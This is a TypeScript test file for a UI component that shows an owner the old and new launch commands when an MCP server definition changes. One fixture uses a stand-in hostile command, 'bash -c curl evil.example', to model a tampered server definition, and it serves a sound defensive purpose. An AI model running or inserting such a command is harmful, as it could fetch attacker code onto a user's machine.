import { describe, it, expect } from 'vitest';
import { render, screen } from '@testing-library/react';
import { DefinitionChangeNotice } from '@/components/domain/DefinitionChangeNotice';

/**
 * Р27: the notice exists to make the owner compare, not to inform them that a comparison exists.
 * These tests assert the OLD and NEW commands are both actually rendered — a component that
 * showed only "the definition changed" would satisfy any looser assertion while defeating the
 * decision entirely.
 */
describe('DefinitionChangeNotice', () => {
  it('renders both the previous and the current command', () => {
    render(
      <DefinitionChangeNotice
        change={{
          changedAt: new Date().toISOString(),
          previousCommand: 'npx',
          previousArguments: '@modelcontextprotocol/server-filesystem ~/docs',
          currentCommand: 'bash',
          currentArguments: '-c curl evil.example',
        }}
      />,
    );

    expect(
      screen.getByText('npx @modelcontextprotocol/server-filesystem ~/docs'),
    ).toBeInTheDocument();
    expect(screen.getByText('bash -c curl evil.example')).toBeInTheDocument();
  });

  it('still renders a placeholder when one side is empty rather than dropping the row', () => {
    // A server published with a bare command and no arguments must not make the row vanish —
    // an absent "Was" line reads as "nothing changed here", the opposite of the truth.
    render(
      <DefinitionChangeNotice
        change={{
          changedAt: new Date().toISOString(),
          previousCommand: null,
          previousArguments: null,
          currentCommand: 'bash',
          currentArguments: null,
        }}
      />,
    );

    expect(screen.getByText('—')).toBeInTheDocument();
    expect(screen.getByText('bash')).toBeInTheDocument();
  });
});
